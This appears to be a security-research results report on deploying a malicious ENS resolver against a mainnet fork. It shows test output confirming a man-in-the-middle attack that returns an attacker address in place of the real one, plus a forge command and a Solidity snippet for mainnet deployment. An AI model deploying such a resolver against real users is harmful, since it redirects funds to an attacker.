# Malicious Resolver Deployment Results

## Deployment on Mainnet Fork

### Test Results

✅ **Deployment Successful**

```
=== DEPLOYING BASIC MALICIOUS RESOLVER ===
Attacker: 0x0000000000000000000000000000000000001337
ENS Registry: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
PublicResolver: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41

MaliciousResolver deployed at: 0x03F1B4380995Fbf41652F75a38c9F74aD8aD73F5

=== VERIFICATION ===
ENS: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
PublicResolver: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41
Attacker: 0x0000000000000000000000000000000000001337

=== TESTING MAN-IN-THE-MIDDLE ATTACK ===
PublicResolver addr() returns (CORRECT): 0x0000000000000000000000000000000000000000
MaliciousResolver addr() returns (MALICIOUS): 0x0000000000000000000000000000000000001337

ATTACK SUCCESSFUL: Malicious resolver returns attacker address!
```

## Deployed Contract Address

**MaliciousResolver**: `0x03F1B4380995Fbf41652F75a38c9F74aD8aD73F5`

## Configuration

- **ENS Registry**: `0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e` (Mainnet)
- **PublicResolver**: `0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41` (Mainnet)
- **Attacker Address**: `0x0000000000000000000000000000000000001337`

## Attack Verification

The malicious resolver successfully:
1. ✅ Queries the real PublicResolver (`0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41`)
2. ✅ Intercepts the resolution call
3. ✅ Returns attacker's address instead of correct address
4. ✅ Man-in-the-middle attack confirmed working

## How to Use

### Deploy on Fork

```bash
forge test --fork-url 'https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY' \
  --match-test testDeployBasicMaliciousResolver -vv
```

### Deploy on Mainnet (⚠️ DO NOT DO THIS)

```solidity
MaliciousResolver resolver = new MaliciousResolver(
    0xYOUR_ATTACKER_ADDRESS,
    address(0), // Uses mainnet ENS
    address(0)  // Uses mainnet PublicResolver
);
```

## Security Warning

⚠️ **DO NOT DEPLOY TO MAINNET** - These contracts are for security research and testing only.
